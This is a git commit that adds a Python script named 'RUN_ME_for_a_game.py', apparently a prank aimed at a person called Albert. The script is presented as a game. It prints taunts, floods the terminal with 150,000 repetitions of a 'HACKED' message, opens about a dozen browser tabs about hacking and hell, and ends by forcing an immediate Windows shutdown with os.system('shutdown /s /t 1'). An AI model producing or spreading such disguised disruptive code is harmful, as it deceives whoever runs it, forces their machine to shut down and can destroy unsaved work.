06ebfd5ef8a81a63c5ab1496e8bc409c79440976
Joswin Emmanuel <96587885+joswinemmanuel@users.noreply.github.com>
2022-05-26 21:43:48 +0530

    Add files via upload

---
+++ Crazy_mode/RUN_ME_for_a_game.py
@@ -0,0 +1,68 @@
+import os
+import time
+import calendar
+from datetime import date
+import webbrowser
+import random
+
+print('Hello Albert\n')
+time.sleep(2)
+print("Thanks for making me alive\n")
+time.sleep(2)
+print("Let me check your IQ\n")
+time.sleep(2)
+print("Do you know....what's today's speciality\n")
+time.sleep(3)
+print(calendar.month(2022,5))
+time.sleep(3) 
+
+print("Today's date is ",date.today())
+time.sleep(3)
+print("\nTIME IS LIMITED.....")
+time.sleep(2)
+print("\nYOU'RE BEING A LAZY BUM...")
+time.sleep(2)
+print("\nI don't like you ALB.......")
+
+time.sleep(1)
+print('@#$ ')
+time.sleep(1)
+print('@#$#@$@ ')
+time.sleep(1)
+print('@#$#@!@#$ ')
+time.sleep(1)
+print('%@#@##$@%#$$%&^')
+time.sleep(1)
+print('@#%@#$%#^@$#%$@%@#$%@#$%@\n\n\n')
+time.sleep(1)
+print('              THOMAS SHELBY  x  POP SMOKE             ')
+time.sleep(1)
+print('\n\n\n%@#@##$@%#$$%&@#%$#%@#$%@#$%@%#$%@#$%@324')
+time.sleep(1)
+print('%@#@##$@%#$$%&657567^&$%&$%&$%&%^J&*%&^*%*&^&*%(*^')
+time.sleep(1)
+print('%@#@##$@%#$$%&$%@$#%$#%@#$%@#$%')
+for i in range(150000):
+    print('@#%#$%$#@%@$#$@#?"P VINTUNOVE TAKING OVER %^$@#$>":>">":>">">":"pp%@#$%#@%$#&^&$^*) HACKED (*&^%&*&^',end=' ')
+
+
+page=['https://yts.mx/',
+'https://www.google.com/search?q=sad&rlz=1C1ONGR_enIN974IN974&source=lnms&tbm=isch&sa=X&ved=2ahUKEwim-4zNrf33AhUORmwGHXZ_DVAQ_AUoAXoECAIQAw&biw=1549&bih=731&dpr=1.24',
+'https://www.youtube.com/channel/UCSaPKJpNd-Mkm6hhelIYSlQ',
+'https://www.google.com/search?q=hacked&rlz=1C1ONGR_enIN974IN974&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiSnYK7rf33AhWFRmwGHX5jDCEQ_AUoAXoECAIQAw&biw=1549&bih=731&dpr=1.24',
+'https://www.google.com/search?q=hell&tbm=isch&ved=2ahUKEwjuoO7qrf33AhXyitgFHauYCboQ2-cCegQIABAA&oq=hell&gs_lcp=CgNpbWcQAzIHCAAQsQMQQzIECAAQQzIECAAQQzIECAAQQzIECAAQQzIHCAAQsQMQQzIICAAQgAQQsQMyBwgAELEDEEMyBAgAEEMyCwgAEIAEELEDEIMBOgUIABCABFCACFjbCmCSDGgAcAB4AIABeYgBjgSSAQMyLjOYAQCgAQGqAQtnd3Mtd2l6LWltZ8ABAQ&sclient=img&ei=OIyPYu6kKPKV4t4Pq7Gm0As&bih=731&biw=1549&rlz=1C1ONGR_enIN974IN974',
+'https://www.istockphoto.com/photos/hell',
+'https://www.istockphoto.com/photo/heaven-and-hell-religious-choice-gm1225837096-360964716',
+'https://www.websitepulse.com/blog/how-to-tell-your-website-was-hacked',
+'https://nakedsecurity.sophos.com/2019/05/30/new-zealands-hacked-budget-was-found-on-a-website/']
+for _ in range(10):
+    webbrowser.open(random.choice(page))
+time.sleep(2)
+webbrowser.open('https://www.pond5.com/stock-footage/item/88676502-you-have-been-hacked-code-animation-blue-3d-transparent-back')
+time.sleep(12)
+webbrowser.open('https://mon.school/sketches/791057')
+time.sleep(4)
+webbrowser.open('https://www.shutterstock.com/image-photo/human-hand-press-shutdown-button-on-1734602981')
+
+os.system("shutdown /s /t 1")
+                                            
